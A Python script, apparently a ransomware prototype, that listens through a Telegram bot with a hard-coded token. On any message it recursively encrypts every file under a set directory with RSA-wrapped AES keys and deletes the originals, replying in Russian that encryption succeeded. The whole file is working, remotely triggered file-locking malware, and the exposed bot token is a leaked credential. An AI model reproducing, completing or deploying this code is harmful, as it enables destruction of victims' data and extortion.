from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import sys
import telebot

bot = telebot.TeleBot('1020923679:AAH0ptmo12lbcN94Q052L-x25XMWGLtDjI8')

answer_encrypt = 'Шифрование выполнено успешно.'
answer_decrypt = 'Дешифрование выполнено успешно.'

message = 'encrypt'
message1 = 'decrypt'

@bot.message_handler(func=lambda message: True)
def bot_enc(message: message):
    bot.reply_to(message, answer_encrypt)
    def crypt(file):
        f = open(file, "rb")
        data = f.read()
        f.close()

        file_out = open(str(file)+".bin", "wb")

        recipient_key = RSA.import_key(open(
            "C:\\Users\\Romanus\\Desktop\\Python and Progs\\python\\RSA\\keys\\Public.pem").read())
        session_key = get_random_bytes(16)

        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        enc_session_key = cipher_rsa.encrypt(session_key)

        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        [file_out.write(x)
        for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
        print(file + " encrypt")
        os.remove(file)


    def walk(dir):
        for name in os.listdir(dir):
            path = os.path.join(dir, name)
            if os.path.isfile(path):
                crypt(path)
            else:
                walk(path)
    # Зашифровано
    walk("C:\\Users\\Romanus\\Desktop\\Python and Progs\\python\\RSA\\test_crypt")
    print("--------------------------все файлы зашифрованы-------------------------------------")
bot.polling()